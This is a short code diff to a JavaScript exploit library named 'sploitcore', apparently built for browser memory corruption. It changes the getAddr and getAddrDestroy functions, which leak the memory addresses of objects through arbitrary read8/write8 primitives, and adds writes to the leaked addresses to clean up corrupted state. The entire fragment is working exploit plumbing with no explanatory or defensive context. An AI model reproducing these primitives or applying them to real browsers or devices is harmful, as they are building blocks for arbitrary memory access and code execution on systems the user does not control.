@@ -234,13 +234,16 @@ sploitcore.prototype.write8 = function(val, addr, offset) {
 	this.write4(val[1], addr, offset + 1);
 };
 sploitcore.prototype.getAddr = function(obj) {
-	this.leakee['b'] = obj;
-	return this.read8(this.leakaddr, 4);
+	this.leakee['b'] = {'a' : obj};
+	return this.read8(this.read8(this.leakaddr, 4), 4);
 };
 sploitcore.prototype.getAddrDestroy = function(obj) {
-	this.leakee['b'] = obj;
-	var addr = this.read8(this.leakaddr, 4);
+	this.leakee['b'] = {'a' : obj};
+	var addr = this.read8(this.read8(this.leakaddr, 4), 4);
+	// Salt the earth.  No object shall ever grow here again.
+	this.write8([0x00000000, 0xffff0000], this.read8(this.leakaddr, 4), 4);
 	this.write8([0x00000000, 0xffff0000], this.leakaddr, 4);
+	this.leakee['b'] = 0;
 	return addr;
 };
 sploitcore.prototype.mref = function(off) {
